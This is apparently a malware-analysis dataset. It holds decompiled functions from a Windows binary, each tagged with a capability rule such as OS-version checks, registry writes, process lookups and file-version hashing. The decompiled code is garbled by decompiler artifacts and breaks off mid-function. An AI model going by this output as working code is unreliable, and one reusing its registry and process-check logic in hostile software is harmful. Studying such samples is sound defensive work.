{
    "004012b0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401318)\n\nuint __cdecl fcn.004012b0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    float10 fVar8;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar5 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_160h = '\\0';\n    puVar5 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x40608c, arg_8h);\n    fVar8 = (*pcVar2)(&var_264h, 0x4060a4, arg_8h);\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar6 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar6 = arg_8h;\n    do {\n        pcVar7 = pcVar6;\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        pcVar7 = pcVar6 + 1;\n        cVar1 = *pcVar6;\n        pcVar6 = pcVar7;\n    } while (cVar1 != '\\0');\n    var_44h = ~uVar4 - 1;\n    var_34h = 0x4060cc;\n    var_30h = 0x4060d8;\n    var_2ch = 0x4060e4;\n    var_28h = 0x4060f4;\n    var_24h = 0x4060fc;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((-1 < var_44h) && (-1 >= var_44h)) {\n        *(pcVar7 + 0x1c) = fVar8;\n    }\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    if ((arg_ch != 0) < 5) {\n        uVar4 = (arg_ch != 0) * 4;\n        do {\n            iVar3 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1187
    },
    "00401440": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040145e) overlaps instruction at (ram,0x0040145b)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl fcn.00401440(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    uint16_t *in_EDX;\n    uint32_t unaff_ESI;\n    bool in_OF;\n    uint16_t *puStack24;\n    uint var_4h;\n    \n    if ((in_OF) || (!in_OF)) {\n        unaff_ESI = arg_8h;\n        puStack24 = in_EDX;\n    }\n    *(in_EDX + 0x57) = *(in_EDX + 0x57) | in_EDX;\n    if (arg_10h != 0) {\n        do {\n            unaff_ESI = unaff_ESI + *arg_ch;\n            if (unaff_ESI >> 0x10 != 0) {\n                unaff_ESI = (unaff_ESI >> 0x10) + (unaff_ESI & 0xffff);\n            }\n            arg_10h = arg_10h + -1;\n            puStack24 = arg_ch;\n            arg_ch = arg_ch + 1;\n        } while (arg_10h != 0);\n    }\n    return CONCAT44(puStack24, (unaff_ESI >> 0x10) + unaff_ESI);\n}\n",
        "token_count": 330
    },
    "00401ca0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00401ca0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00401810(0x80000002, 0x406204, 0x406250, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 131
    },
    "00401eb0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401eea) overlaps instruction at (ram,0x00401ee6)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00401eb0(void)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    uint extraout_ECX;\n    uint32_t unaff_EBX;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    bool bVar3;\n    bool bVar4;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    uint var_8ch;\n    \n    bVar3 = &stack0xfffffffc < 0x94;\n    bVar4 = *0x10 == 0x98;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if (((bVar3 || bVar4) || (unaff_EBX = unaff_EBX & 0xffff00ff,  !bVar3 && !bVar4)) && (var_90h == 5)) {\n        return 1;\n    }\n    *unaff_EDI = *unaff_ESI;\n    pcVar1 = (unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX)) + 0x50c35de5;\n    *pcVar1 = *pcVar1 + extraout_ECX;\n    *(iVar2 + -4) = extraout_ECX;\n    if ((*0xfffffee0 == 6) && (*0xfffffee4 == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 356
    },
    "00402610": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402cfd) overlaps instruction at (ram,0x00402cfc)\n// \n\nvoid fcn.00402610(void)\n\n{\n    char *pcVar1;\n    uchar uVar2;\n    uint8_t uVar3;\n    uint uVar4;\n    uint8_t extraout_CL;\n    uint8_t extraout_CL_00;\n    int16_t extraout_CX;\n    int32_t extraout_ECX;\n    int32_t iVar5;\n    int32_t extraout_ECX_00;\n    int32_t iVar6;\n    uint8_t extraout_DH;\n    ushort extraout_DX;\n    uint unaff_EBX;\n    uint32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t **unaff_EDI;\n    uchar uVar7;\n    bool bVar8;\n    uint8_t in_AF;\n    char cVar9;\n    bool bVar10;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar11;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint8_t uVar12;\n    uint32_t uVar13;\n    uint8_t *puVar14;\n    uchar uVar15;\n    ushort uVar16;\n    uchar uVar17;\n    ushort uVar18;\n    uchar uVar19;\n    uchar uVar20;\n    ushort uVar21;\n    uchar uVar22;\n    uchar uVar23;\n    ushort uVar24;\n    uint32_t arg_14h;\n    char cVar25;\n    uchar uVar26;\n    uint arg_10h;\n    uint arg_14h_00;\n    \n    fcn.00403f50(0x40651c, 0xc, 0x406024, 10);\n    uVar3 = unaff_EBX >> 8;\n    uVar7 = 0xcf < uVar3;\n    cVar9 = uVar3 == 0xd0;\n    do {\n        fcn.00403f50(0x40651c, 0xc, 0x406030, 0x40651c);\n        iVar5 = extraout_ECX;\n        if ((uVar7) || (!uVar7)) break;\n        iVar5 = extraout_ECX + -1;\n    } while (iVar5 != 0 && cVar9 != '\\0');\n    iVar6 = *unaff_ESI;\n    *unaff_EDI = unaff_ESI + 1;\n    pcVar1 = (iVar6 >> 0x1f) + 0xc;\n    *pcVar1 = *pcVar1 + (iVar5 >> 8);\n    arg_14h = 0;\n    cVar9 = fcn.00403f50(0x40651c, unaff_EDI, 0x6ab8ec44, unaff_EBP);\n    uVar7 = false;\n    cVar9 = ((extraout_CX + 1U & 0xff | (extraout_CX + 1U >> 8 & cVar9 + 2U) << 8) & 0x7bc9) == 0;\n    arg_14h_00 = 0x40604800;\n    uVar15 = 0x1c;\n    uVar16 = 0x4065;\n    arg_10h = 0xc00;\n    uVar4 = fcn.00403f50(0x40651c, 0xc, 0x406048, 0xc);\n    if ((!uVar7) && (uVar7)) {\n        out(0xbd, uVar4);\n        return;\n    }\n    do {\n        arg_14h = arg_14h & 0xff | 0xc00;\n        cVar25 = 'T';\n        uVar26 = 0;\n        fcn.00403f50(0x40651c, 0xc, 0x406054, 0x40651c);\n        iVar5 = *0x6ab8ec44;\n        iVar6 = extraout_ECX_00;\n        if ((uVar7) || (!uVar7)) break;\n        iVar6 = extraout_ECX_00 + -1;\n    } while (iVar6 != 0 && cVar9 != '\\0');\n    *unaff_EDI = 0x6ab8ec48;\n    uVar13 = *(*0x9750e2b5 + 0x5c);\n    pcVar1 = (iVar5 >> 0x1f) + 0xc;\n    *pcVar1 = *pcVar1 + (iVar6 >> 8);\n    fcn.00403f50(0x40651c, unaff_EDI, 0x6ab8ec44, unaff_EBP | uVar13);\n    fcn.00403f50(0x40651c, 0xc, 0x406068, 0xc);\n    fcn.00403f50(0x40651c, 0xc, 0x406074, 8);\n    fcn.00403f50(0x40651c, 0xc, 0x40607c, 0xd);\n    fcn.00403f50(0x40651c, 0xc, 0x40608c, 0x18);\n    fcn.00403f50(0x40651c, 0xc, 0x4060a4, 0x25);\n    fcn.00403f50(0x40651c, 0xc, 0x4060cc, 10);\n    fcn.00403f50(0x40651c, 0xc, 0x4060d8, 0xc);\n    fcn.00403f50(0x40651c, 0xc, 0x4060e4, 0xd);\n    fcn.00403f50(0x40651c, 0xc, 0x4060f4, 6);\n    fcn.00403f50(0x40651c, 0xc, 0x4060fc, 5);\n    fcn.00403f50(0x40651c, 0xc, 0x406104, 0xd);\n    fcn.00403f50(0x40651c, 0xc, 0x406114, 0x19);\n    fcn.00403f50(0x40651c, 0xc, 0x406130, 0xf);\n    fcn.00403f50(0x40651c, 0xc, 0x406140, 0xe);\n    bVar8 = extraout_DH < extraout_CL;\n    bVar11 = SBORROW1(extraout_DH, extraout_CL);\n    bVar10 = extraout_DH == extraout_CL;\n    uVar22 = 0xd;\n    uVar23 = 0;\n    uVar24 = 0;\n    uVar19 = 0x50;\n    uVar20 = 0x61;\n    uVar21 = 0x40;\n    uVar7 = 0xc;\n    uVar17 = 0;\n    uVar18 = 0;\n    fcn.00403f50(0x40651c, 0xc, 0x406150, 0xd);\n    if ((!bVar11) && (bVar11)) {\n        puVar14 = unaff_EDI + 1;\n        uVar2 = in(extraout_DX);\n        *unaff_EDI = uVar2;\n        uVar4 = arg_10h;\n        if (!bVar8 && !bVar10) goto code_r0x00402a1d;\n    }\n    uVar4 = CONCAT22(uVar18, CONCAT11(uVar17, uVar7));\n    *(arg_14h + 0xc) = *(arg_14h + 0xc) + cVar25;\n    fcn.00403f50(0x40651c, CONCAT22(uVar16, CONCAT11(uVar15, uVar26)), arg_10h, arg_14h_00);\n    puVar14 = 0x56;\n    fcn.00403f50(0x40651c, 0xc, 0x40616c, 0xf);\n    fcn.00403f50(0x40651c, 0xc, 0x40617c, 0xb);\ncode_r0x00402a1d:\n    fcn.00403f50(0x40651c, 0xc, 0x406188, 0xb);\n    fcn.00403f50(0x40651c, 0xc, 0x406194, 0xb);\n    fcn.00403f50(0x40651c, 0xc, 0x4061a0, 10);\n    uVar3 = fcn.00403f50(0x40651c, 0xc, 0x4061ac, 0xc);\n    cVar9 = uVar3 - *puVar14;\n    iVar5 = (cVar9 < '\\0') * 0x80;\n    uVar12 = iVar5 | (cVar9 == '\\0') * '@' | (in_AF & 1) * '\\x10' | ((POPCOUNT(cVar9) & 1U) == 0) * '\\x04' |\n             uVar3 < *puVar14;\n    uVar13 = (in_NT & 1) * 0x40 | SBORROW1(uVar3, *puVar14) * 8 | (in_IF & 1) * 2 | in_TF & 1 | iVar5 >> 8 |\n             (in_ID & 1) * 0x2000 | (in_VIP & 1) * 0x1000 | (in_VIF & 1) * 0x800 | (in_AC & 1) * 0x400;\n    func_0x10188a64();\n    fcn.00403f50(0x40651c, 0xc, 0x4061b8, CONCAT31(uVar13, uVar12));\n    cVar9 = '\\0';\n    uVar7 = 200;\n    uVar15 = 0x61;\n    uVar16 = 0x40;\n    puVar14 = 0xc;\n    iVar5 = fcn.00403f50(0x40651c, 0xc, 0x4061c8, 0x11);\n    *(iVar5 + 0x6a39da56) = *(iVar5 + 0x6a39da56) ^ extraout_CL_00;\n    pcVar1 = CONCAT22(uVar16, CONCAT11(uVar15, uVar7)) + 0xc;\n    bVar8 = SCARRY1(*pcVar1, cVar9);\n    *pcVar1 = *pcVar1 + cVar9;\n    uVar7 = 0x1c;\n    uVar15 = 0x65;\n    uVar16 = 0x40;\n    fcn.00403f50(0x40651c, CONCAT22(uVar21, CONCAT11(uVar20, uVar19)), CONCAT22(uVar24, CONCAT11(uVar23, uVar22)), \n                 arg_14h);\n    if ((!bVar8) && (bVar8)) {\n        *CONCAT22(uVar16, CONCAT11(uVar15, uVar7)) = uVar4;\n        return;\n    }\n    fcn.00403f50(0x40651c, 0xc, 0x4061f0, 0x14);\n    fcn.00403f50(0x40651c, 0xc, 0x406204, 0x33);\n    fcn.00403f50(0x40651c, 0xc, 0x406238, 10);\n    fcn.00403f50(0x40651c, 0xc, str.aR_, 4);\n    fcn.00403f50(0x40651c, 0xc, str.aR_ + 4, 5);\n    fcn.00403f50(0x40651c, 0xc, 0x406250, 6);\n    fcn.00403f50(0x40651c, 0xc, 0x406258, 0xc);\n    fcn.00403f50(0x40651c, 0xc, 0x406264, 0xc);\n    bVar8 = false;\n    uVar4 = 0x402ced;\n    fcn.00403f50(0x40651c, 0xc, 0x40629c, 0x2a);\n    if ((bVar8) || (!bVar8)) {\n        uVar4 = 0xb;\n    }\n    *puVar14 = *puVar14 & 0xc3;\n    fcn.00403f50(0x40651c, 0xc, 0x4062c8, uVar4);\n    fcn.00403f50(0x40651c, 0xc, 0x406324, 0x41);\n    fcn.00403f50(0x40651c, 0xc, 0x406368, 0x33);\n    fcn.00403f50(0x40651c, 0xc, 0x40639c, 0x4b);\n    fcn.00403f50(0x40651c, 0xc, 0x4063e8, 0x39);\n    fcn.00403f50(0x40651c, 0xc, 0x406424, 8);\n    fcn.00403f50(0x40651c, 0xc, 0x40642c, 0x14);\n    return;\n}\n",
        "token_count": 3132
    },
    "00403af0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403bf5) overlaps instruction at (ram,0x00403bf4)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403af0(uint arg_8h, int32_t arg_ch, uint *arg_10h, int32_t *arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *unaff_EBX;\n    bool bVar4;\n    ulong uVar5;\n    uint var_4h;\n    \n    uVar5 = fcn.00401440(0, arg_8h, arg_ch + 1U >> 1);\n    uVar1 = uVar5 & 0xffff;\n    bVar4 = 0xfffffff3 < &stack0xffffffe0;\n    if ((!bVar4) && (bVar4)) {\n        unaff_EBX = unaff_EBX + bVar4 + *(unaff_EBX + (uVar5 >> 0x20) * 4 + 0x69);\n    }\n    uVar5 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar3 = *(uVar5 + 0x58);\n    bVar4 = uVar1 < uVar3;\n    if (bVar4) {\n        if ((!bVar4) && (bVar4)) {\n            unaff_EBX = unaff_EBX + bVar4 + *(unaff_EBX + (uVar5 >> 0x20) * 4 + 0x69);\n        }\n        iVar2 = (uVar1 - uVar3 & 0xffff) - 1;\n    }\n    else {\n        iVar2 = uVar1 - (uVar3 & 0xffff);\n    }\n    if (iVar2 < uVar3 >> 0x10) {\n        *unaff_EBX = *unaff_EBX & 0xc3;\n        *0xffff = *0xffff << 8;\n    }\n    else {\n        uVar3 = iVar2 - (uVar3 >> 0x10);\n    }\n    *arg_14h = uVar3 + arg_ch;\n    *arg_10h = *(uVar5 + 0x58);\n    return;\n}\n",
        "token_count": 515
    },
    "00403c40": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00403c40(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    ushort in_SS;\n    bool bVar4;\n    uint var_80h;\n    uint var_60h;\n    uint var_40h;\n    uchar var_20h;\n    uint var_1fh;\n    \n    iVar1 = fcn.00401eb0();\n    if (iVar1 == 0) {\n        fcn.00403e00();\n        return false;\n    }\n    fcn.00401c00();\n    while( true ) {\n        iVar1 = fcn.004040c0(0x406074);\n        if (iVar1 != -1) {\n            iVar1 = fcn.004040c0(0x406068);\n            if (iVar1 == -1) {\n                fcn.00403e00();\n            }\n            return false;\n        }\n        fcn.00402d90();\n        uVar2 = fcn.004031a0();\n        bVar4 = (POPCOUNT(uVar2 & 0xff) & 1U) == 0;\n        if (uVar2 != 0) break;\n        if (((bVar4) || (!bVar4)) || (segment(in_SS, *0x10 + -0x90),  !bVar4)) {\n            var_20h = 0;\n            var_80h._0_1_ = 0;\n            puVar3 = &var_1fh;\n            for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + 2) = 0;\n            var_60h._0_1_ = 0;\n            puVar3 = &var_80h + 1;\n            for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + 2) = 0;\n            var_40h._0_1_ = 0;\n            puVar3 = &var_60h + 1;\n            for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + 2) = 0;\n            puVar3 = &var_40h + 1;\n            for (iVar1 = 7; iVar1 != 0; iVar1 = iVar1 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *puVar3 = 0;\n            *(puVar3 + 2) = 0;\n            iVar1 = fcn.00404940(&var_80h, &var_60h, &var_20h, &var_40h);\n            if (iVar1 != 0) {\n                iVar1 = fcn.004041f0(&var_20h);\n                if (iVar1 != 0) {\n                    iVar1 = fcn.00401000(&var_80h, &var_60h, &var_20h, &var_40h);\n                    return iVar1 != 0;\n                }\n                return false;\n            }\n            return false;\n        }\n    }\n    return false;\n}\n",
        "token_count": 828
    },
    "004040c0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404186) overlaps instruction at (ram,0x00404182)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004040c0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    unkbyte10 extraout_ST0;\n    ulong uVar5;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0xffffffff;\n    iVar1 = (**0x41f4d4)();\n    if (iVar1 == -1) {\n        return 0xffffffff;\n    }\n    var_130h = 0x128;\n    puVar4 = &var_12ch;\n    var_4h = iVar1;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    iVar2 = (**0x41f4d8)();\n    do {\n        if (iVar2 == 0) {\ncode_r0x00404192:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n            return var_8h;\n        }\n        uVar5 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_10ch, arg_8h);\n        piVar3 = uVar5 >> 0x20;\n        iVar1 = uVar5;\n        if (iVar1 == 0) {\n            if ((-1 < iVar1) && (-1 >= iVar1)) {\n                *0x8316dbec = extraout_ST0;\n                *piVar3 = *piVar3 + -0x6a74207c;\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            var_8h = var_128h;\n            iVar1 = var_4h;\n            goto code_r0x00404192;\n        }\n        iVar2 = (**0x41f4dc)(var_4h, &var_130h);\n        iVar1 = var_4h;\n    } while( true );\n}\n",
        "token_count": 545
    },
    "004023a0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004024b4) overlaps instruction at (ram,0x004024b2)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint __cdecl fcn.004023a0(uint lptstrFilename, uint s)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    uint8_t uVar4;\n    bool bVar5;\n    char cVar6;\n    char cVar7;\n    uint32_t uStack99;\n    code *pcStack95;\n    uint uStack91;\n    uint *puStack87;\n    uint *puStack83;\n    unkbyte3 Stack79;\n    uint uStack76;\n    int32_t iStack72;\n    uint var_20h;\n    uint var_1ah;\n    uint pBlock;\n    uint dwLen;\n    uint puLen;\n    int32_t lplpBuffer;\n    uint lpdwHandle;\n    \n    lpdwHandle = 0;\n    iVar2 = sub.VERSION.dll_GetFileVersionInfoSizeA();\n    uVar4 = 0;\n    cVar7 = '\\0';\n    cVar6 = iVar2 < 0;\n    bVar5 = iVar2 == 0;\n    if (!bVar5) {\n        puLen = 0;\n        iVar3 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        if ((bVar5 || cVar7 != cVar6) || (!bVar5 && cVar7 == cVar6)) {\n            iStack72 = 0x4023e9;\n            pcStack95 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        }\n        else {\n            pcStack95 = sym.imp.KERNEL32.dll_GlobalLock + uVar4 + iVar3;\n        }\n        uStack76 = lpdwHandle;\n        Stack79 = lptstrFilename >> 8;\n        puStack87 = puStack87 & 0xffffff | 0xc000000;\n        puStack83 = CONCAT13(lptstrFilename, 0x4024);\n        iStack72 = iVar2;\n        sub.VERSION.dll_GetFileVersionInfoA();\n        puStack83 = &fcn.004023a0::puLen;\n        puStack87 = &fcn.004023a0::lplpBuffer;\n        uStack91 = 0x406528;\n        uStack99 = 0x40242b;\n        sub.VERSION.dll_VerQueryValueA();\n        uStack99 = *(lplpBuffer + 0x14);\n        (*_sym.imp.MSVCRT.dll_sprintf)\n                  (s, 0x4064e0, *(lplpBuffer + 0x10) >> 0x10, *(lplpBuffer + 0x10), *(lplpBuffer + 0x14) >> 0x10);\n        uStack99 = iVar3;\n        (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n        pcVar1 = _sym.imp.KERNEL32.dll_GlobalFree;\n        *((&stack0xffffff9d ^ *(unaff_EBX + 0x56)) - 4) = 0x4024bb;\n        (*pcVar1)();\n    }\n    return 1;\n}\n",
        "token_count": 708
    },
    "00401620": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401705) overlaps instruction at (ram,0x00401704)\n// \n// WARNING: Removing unreachable block (ram,0x004016e7)\n// WARNING: Removing unreachable block (ram,0x004016fb)\n// WARNING: Removing unreachable block (ram,0x00401704)\n\nuint fcn.00401620(uint *param_1)\n\n{\n    uint8_t *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    uint *puVar8;\n    bool bVar9;\n    bool bVar10;\n    bool bVar11;\n    ulong uVar12;\n    uint uStack523;\n    \n    puVar8 = &uStack523;\n    for (iVar6 = 0x7f; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *(puVar8 + 2) = 0;\n    iVar6 = fcn.004019f0();\n    if (iVar6 == 0) {\n        return 0;\n    }\n    bVar9 = param_1 != 0xffffffff;\n    bVar11 = param_1 == 0xffffffff;\n    puVar7 = &stack0xfffffffc;\n    if (bVar11) {\n        uVar12 = fcn.00401940();\n        bVar9 = false;\n        bVar11 = uVar12 == 0;\n        bVar10 = (POPCOUNT(uVar12 & 0xff) & 1U) == 0;\n        if (bVar11) {\n            bVar9 = false;\n            bVar11 = false;\n            param_1 = 0xd;\n            puVar7 = &stack0xfffffffc;\n        }\n        else if ((bVar10) || (!bVar10)) {\n            param_1 = 0xc;\n            puVar7 = &stack0xfffffffc;\n        }\n        else {\n            param_1 = 0x34a96cf4;\n            puVar1 = (uVar12 >> 0x20) + 1;\n            puVar7 = *0xbe17b43a;\n            bVar9 = CARRY1(*puVar1, puVar1);\n            *puVar1 = *puVar1 + puVar1;\n            bVar11 = *puVar1 == 0;\n        }\n    }\n    if ((!bVar9 && !bVar11) && (bVar9 || bVar11)) {\n        *(puVar8 + 3) = *param_1;\n        puVar7 = 0x8de181d1;\n        param_1 = param_1 + 1;\n    }\n    iVar6 = (**0x41f4bc)();\n    if (iVar6 == 0) {\n        uVar2 = (**0x41f4c4)();\n    // WARNING: Bad instruction - Truncating control flow here\n        (*_sym.imp.MSVCRT.dll_sprintf)(puVar7 + -0x208, 0x406280, uVar2, param_1);\n        iVar6 = (**0x41f4c0)(0x41f4d0, 0, 0, 0, 0);\n        if (iVar6 == 0) {\n            return 0;\n        }\n        *(puVar7 + -4) = 3000;\n        iVar3 = (**0x41f4b8)(iVar6, 2, puVar7 + -4, 4);\n        pcVar4 = iVar3 + 0x68006a;\n        *pcVar4 = *pcVar4 + pcVar4;\n        uVar5 = (**0x41f4b4)(iVar6, puVar7 + -0x208, 0);\n        bVar11 = (POPCOUNT(uVar5 & 0xff) & 1U) == 0;\n        if (uVar5 != 0) {\n            if ((bVar11) || (!bVar11)) {\n                (**0x41f4c8)(uVar5);\n            }\n            else {\n                *(uVar5 - 1) = *(uVar5 - 1) + 0x15;\n            }\n            (**0x41f4c8)(iVar6);\n            return 1;\n        }\n        (**0x41f4c8)(iVar6);\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 1027
    },
    "00401940": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040197a) overlaps instruction at (ram,0x00401978)\n// \n// WARNING: Removing unreachable block (ram,0x0040196c)\n// WARNING: Removing unreachable block (ram,0x00401973)\n\nbool fcn.00401940(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar uStack272;\n    uint uStack271;\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    uStack272 = 0;\n    uStack8 = 0x104;\n    puVar2 = &uStack271;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00401810(0x80000001, 0x40629c, 0x4062c8, auStack12, &uStack272, &uStack8);\n    if (iVar1 != 0) {\n        iVar1 = fcn.004018c0(&uStack272);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 299
    },
    "00401cf0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401df9)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl\nfcn.00401cf0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((0x10b < &stack0xfffffffc && *0x10 != 0x110) && (0x10b >= &stack0xfffffffc || *0x10 == 0x110)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.00403590(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    fcn.00403590(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    fcn.00403590(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    fcn.00403590(arg_18h, arg_1ch, arg_14h, 0x20, arg_20h + 0xe0);\n    iVar1 = 